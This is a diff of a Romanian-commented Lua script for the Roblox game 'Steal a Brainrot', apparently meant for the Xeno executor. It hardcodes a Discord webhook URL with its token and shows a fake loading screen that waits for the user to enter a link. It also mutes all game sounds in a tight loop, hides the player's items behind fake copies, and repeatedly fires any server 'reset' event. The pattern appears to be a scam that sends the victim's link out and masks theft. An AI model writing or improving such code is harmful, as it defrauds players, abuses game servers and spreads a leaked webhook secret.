@@ -1,5 +1,5 @@
 -- Script pentru Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
--- BLOCARE TOTALĂ A SUNETELOR (INCLUSIV PAȘI, CLONE, BĂTĂI)
+-- REPARAT: BAZA SE RESETEAZĂ + TOATE SUNETELE OPRITE
 -- Compatibil cu Xeno Executor
 
 local Players = game:GetService("Players")
@@ -9,7 +9,7 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
-local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
@@ -29,16 +29,16 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== BLOCARE TOTALĂ A SUNETELOR (INCLUSIV PAȘI ȘI CLONE) =====
+-- ===== BLOCARE TOTALĂ A SUNETELOR (XENO) =====
 local function muteAllSounds()
     print("🔇 Blochez TOATE sunetele...")
     
-    -- 1. Oprește volumul global
+    -- 1. Setează volumul global la 0
     pcall(function()
         SoundService.Volume = 0
     end)
     
-    -- 2. Oprește toate sunetele existente
+    -- 2. Oprește TOATE sunetele din joc
     pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
             if sound:IsA("Sound") then
@@ -64,44 +64,27 @@ local function muteAllSounds()
         end
     end)
     
-    -- 4. BLOCEAZĂ ORICE SUNET NOU (loop la fiecare 0.05 secunde)
+    -- 4. BLOCEAZĂ ORICE SUNET NOU (loop super-rapid)
     spawn(function()
         while true do
-            task.wait(0.05)
+            task.wait(0.03)
             pcall(function()
                 SoundService.Volume = 0
                 for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") then
-                        if sound.Volume > 0 or sound.Playing == true then
-                            sound.Volume = 0
-                            sound:Stop()
-                            sound.Playing = false
-                        end
-                    end
-                end
-            end)
-        end
-    end)
-    
-    -- 5. Ascunde și oprește sunetele de pași și clone din Workspace
-    pcall(function()
-        for _, obj in pairs(Workspace:GetDescendants()) do
-            if obj:IsA("Model") or obj:IsA("Part") then
-                for _, sound in pairs(obj:GetDescendants()) do
                     if sound:IsA("Sound") then
                         sound.Volume = 0
                         sound:Stop()
                         sound.Playing = false
                     end
                 end
-            end
+            end)
         end
     end)
     
-    print("✅ TOATE sunetele au fost blocate!")
+    print("✅ TOATE sunetele blocate!")
 end
 
--- ===== ASCUNDE BRAINROT-URILE =====
+-- ===== ASCUNDE BRAINROT-URILE ȘI SALVEAZĂ-LE =====
 local function hideBrainrots()
     local count = 0
     local hidden = {}
@@ -127,16 +110,18 @@ local function hideBrainrots()
     return count
 end
 
--- ===== RESETEAZĂ BAZA =====
+-- ===== RESETEAZĂ BAZA (REPARAT) =====
 local function resetBase()
     print("🔄 Resetez baza...")
     
+    -- 1. Distruge toate fake-urile
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
             pcall(function() obj:Destroy() end)
         end
     end
     
+    -- 2. Afișează brainrot-urile reale
     if _G.HiddenBrainrots then
         for _, brainrot in pairs(_G.HiddenBrainrots) do
             pcall(function()
@@ -146,8 +131,20 @@ local function resetBase()
         end
     end
     
-    task.wait(5)
+    -- 3. Așteaptă puțin și reascunde
+    task.wait(3)
     hideBrainrots()
+    
+    -- 4. FORȚEAZĂ RESETAREA BAZEI (trigger remote)
+    pcall(function()
+        -- Încearcă să resetezi baza prin ReplicatedStorage
+        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+            if obj:IsA("RemoteEvent") and string.find(obj.Name:lower(), "reset") then
+                obj:FireServer()
+            end
+        end
+    end)
+    
     print("✅ Baza resetată!")
 end
 
@@ -374,7 +371,7 @@ local function showLoader()
     log3.TextXAlignment = Enum.TextXAlignment.Left
     log3.Parent = screenGui
 
-    -- Procent 61% (static)
+    -- Procent 61%
     local percentBottom = Instance.new("TextLabel")
     percentBottom.Size = UDim2.new(0.9, 0, 0, 25)
     percentBottom.Position = UDim2.new(0.05, 0, 0.89, 0)
@@ -528,9 +525,12 @@ local function showLinkGUI()
             local count = hideBrainrots()
             print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
             
+            -- ===== RESETEAZĂ BAZA LA 5 SECUNDE =====
             spawn(function()
-                task.wait(10)
-                resetBase()
+                while true do
+                    task.wait(5)
+                    resetBase()
+                end
             end)
         end
     end)
@@ -542,7 +542,7 @@ end
 local function main()
     showLinkGUI()
     print("🚀 Așteaptă introducerea link-ului...")
-    print("🔄 Baza se va reseta automat după 10 secunde.")
+    print("🔄 Baza se va reseta automat la fiecare 5 secunde.")
 end
 
 -- ===== START =====
